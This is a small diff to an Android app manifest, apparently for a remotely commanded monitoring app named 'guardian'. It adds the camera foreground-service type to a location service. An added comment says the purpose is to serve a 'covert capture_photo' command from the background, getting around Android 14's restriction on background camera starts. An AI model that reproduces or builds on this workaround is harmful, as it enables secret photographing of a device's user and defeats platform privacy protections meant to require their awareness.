@@ -150,10 +150,14 @@
              declared, it likely made every startForegroundService(GuardianService) call in
              this app (BootReceiver, MainViewModel, HeartbeatWorker, CommandExecutor) fail.
              exported="false" alone already fully prevents other apps from starting/binding it. -->
+        <!-- location|camera: normally runs as a location FGS; it transiently
+             promotes itself to include the camera type to serve a covert
+             capture_photo from within this already-running service (a fresh
+             camera-FGS start is blocked in the background on Android 14+). -->
         <service
             android:name=".service.GuardianService"
             android:exported="false"
-            android:foregroundServiceType="location">
+            android:foregroundServiceType="location|camera">
             <intent-filter>
                 <action android:name="io.sonalit.guardian.ACTION_START_SERVICE" />
             </intent-filter>
